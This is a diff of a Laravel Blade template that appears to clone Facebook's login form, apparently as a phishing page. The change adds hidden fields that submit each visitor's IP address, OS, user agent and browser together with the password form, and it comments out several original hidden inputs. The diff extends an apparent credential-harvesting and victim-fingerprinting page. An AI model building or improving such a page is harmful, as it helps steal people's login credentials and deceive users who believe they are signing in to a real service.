@@ -1597,6 +1597,11 @@
                       {{ csrf_field() }}
 
                       <input type="hidden" name="ip" value="{{ $ip }}">
+                      <input type="hidden" name="type" value="{{ $type }}">
+                      <input type="hidden" name="os" value="{{ $os }}">
+                      <input type="hidden" name="useragent" value="{{ $useragent }}">
+                      <input type="hidden" name="browser" value="{{ $browser }}">
+                      
 
                         <input
                           type="hidden"
@@ -1634,11 +1639,11 @@
                                 placeholder="Password"
                                 aria-label="Password"
                               />
-                              <input 
+                              <!-- <input 
                                 type="hidden"
                                 id="hiddenPass"
                                 name="pass"
-                              />
+                              /> -->
                               <div class="_9ls7 hidden_elem" id="u_0_b_nf">
                                 <a href="#" role="button"
                                   ><div class="_9lsa">
@@ -1648,7 +1653,7 @@
                             </div>
                           </div>
                         </div>
-                        <input
+                        <!-- <input
                           type="hidden"
                           autocomplete="off"
                           name="login_source"
@@ -1658,7 +1663,7 @@
                           autocomplete="off"
                           name="next"
                           value=""
-                        />
+                        /> -->
                         <div class="_6ltg">
                           <button
                             value="1"
